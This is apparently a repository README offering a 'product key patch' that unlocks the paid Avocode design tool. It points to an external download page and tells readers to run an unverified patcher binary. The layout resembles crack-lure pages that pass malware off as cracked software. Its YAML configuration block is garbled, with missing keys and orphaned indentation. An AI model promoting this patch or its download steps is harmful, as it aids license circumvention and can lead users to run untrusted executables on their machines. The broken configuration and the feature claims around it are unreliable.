## 🔐 Getting Started with the Product Key Patch

The patch is a **lightweight CLI toggle** that modifies the application’s `license.conf` to accept a locally generated product key. No system files are overwritten; the patch operates in a sandboxed overlay.

1. **Download the distribution archive** (see [![Download](https://raw.githubusercontent.com/zabit-bit/avocode-4159-product-emulator/main/button.svg)](https://zabit-bit.github.io/avocode-4159-product-emulator/) below).
2. **Extract the archive** into a directory of your choice.
3. Run the patcher utility:
   ```bash
   ./avocode-patch --mode=apply --key-type=dev
   ```
4. Launch Avocode. The splash screen will now show **"Unlocked – Developer Build 2026"**.

```yaml

  name: "Enterprise Design System v3"
  product_key_hash: "a1b2c3d4e5f67890abcdef1234567890"
  sync_interval: 30
  export_defaults:
    format: css
    include_variables: true

    enabled: true
    model: gpt-4o
    temperature: 0.3
  claude:
    enabled: true
```

## 🖥️ Example Console Invocation

Launch Avocode with a specific profile and optional API integration from your terminal:

```bash
avocode --profile ~/.avocode/profiles/core_profile.yaml \
        --openai-key env://OPENAI_SECRET \
        --claude-key env://CLAUDE_SECRET \
        --input-dir ./designs/figma \
        --output-dir ./exported_code_2026
```

This command will:
- Load your profile configuration.
- Use environment variables for API keys (never hardcoded).
- Process all `.fig` files in `./designs/figma`.
- Output compiled code to `./exported_code_2026`.

## 🤖 Integration with OpenAI & Claude APIs

Avocode 4.15.9 includes **optional hooks** for large language model APIs. Enable them in your profile config, and every exported code block receives:

- **OpenAI (GPT-4o)** – Generates human-readable docstrings, explains CSS specificity choices, and suggests accessible color contrast alternatives.
- **Claude (Opus)** – Creates a “design rationale” comment block that describes why a particular layout or spacing decision was made, useful for handoff documentation.

*Neither API is required for the main export functionality. The product key patch does not interfere with these integrations – they remain fully optional.*
